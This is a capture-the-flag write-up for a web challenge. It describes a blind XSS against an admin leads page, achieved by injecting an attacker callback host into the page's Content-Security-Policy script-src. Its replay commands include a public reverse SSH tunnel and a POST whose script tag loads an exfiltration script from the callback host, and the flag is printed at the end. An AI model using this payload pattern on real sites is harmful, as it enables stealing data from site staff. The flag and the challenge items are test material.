# NO.5 Blind Ads Cross

## Metadata

- Event: ByteCTF 143
- Category: Web
- Pattern: CSP source injection plus blind XSS callback
- Knowledge link:
  [ctf-knowledge-web.md#csp-source-injection-for-blind-xss](ctf-knowledge-web.md#csp-source-injection-for-blind-xss)
- Local solution:
  [solution.md](../../../ctf/bytectf-143/challenges/no5-blind-wild-bug/notes/solution.md)

## Prompt Summary

The target is an ads lead submission site. The public page accepts lead data,
and employees are directed to `/ads/leads` for analysis. Direct access to the
employee page is unauthorized, making the bug blind from the attacker view.

## Signals

- The title and prompt point toward blind XSS.
- `/ads/leads` returns `401` but exposes `Content-Security-Policy: script-src ;`.
- Submitted fields are rendered as HTML to an admin Firefox browser.
- `website_link` values can influence the `script-src` source list.
- A crafted `website_link` ending in `;/` can add the callback host to CSP.

## Route

1. Run the local casebook gate and preserve the top "in the wild" and HTTP
   evidence routes as hypotheses.
2. Capture the homepage and `/ads/leads` baseline with `ctf_web.py`.
3. Confirm blind rendering with a harmless `<img src=https://<callback>/...>`.
4. Run `ctf_oob.py serve` behind a public tunnel to capture callbacks.
5. Verify CSP source injection using `website_link:
   https://<callback-host>;/`.
6. Serve an external JavaScript exfil payload from the callback server.
7. Submit `<script src=https://<callback-host>/x.js>...</script>` in `name`
   and the CSP-injecting `website_link`.
8. Read `/collect` callback logs for the flag in the admin leads table.

## Replay Commands

```bash
python scripts/sec.py probe web serve \
  --case-dir ctf/bytectf-143/challenges/no5-blind-wild-bug \
  --label no5-js-callback \
  --host 127.0.0.1 \
  --port 9000 \
  --response-file ctf/bytectf-143/challenges/no5-blind-wild-bug/files/exfil.js \
  --response-type 'application/javascript; charset=utf-8'

ssh -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o ServerAliveInterval=30 \
  -R 80:127.0.0.1:9000 \
  nokey@localhost.run

python scripts/sec.py probe web request \
  --case-dir ctf/bytectf-143/challenges/no5-blind-wild-bug \
  --url https://a7777f2bae583cdc1c7db4dde785f22a.ctf.bytedance.net/ads/leads/submit \
  --method POST \
  --header 'Content-Type: application/json' \
  --data '{"name":"<script src=https://<callback-host>/x.js?case=no5&marker=exploit-001></script>","email":"exploit1@example.com","phone":"10086","website_link":"https://<callback-host>;/","company":"Exploit","country":"CN","industry":"Technology"}' \
  --label submit_exploit_script_csp \
  --timeout 45
```

## False Leads

- Submitting the callback URL as `website_link` alone does not make the worker
  visit that URL.
- Event-handler payloads such as `onerror=fetch(...)` are blocked by CSP.
- Stylesheet and iframe probes do not replace the CSP source injection step.

## Final

`flag{ff19d32b80ccf8741d68931398048df7f63a19679c1bf2c733679a93}`
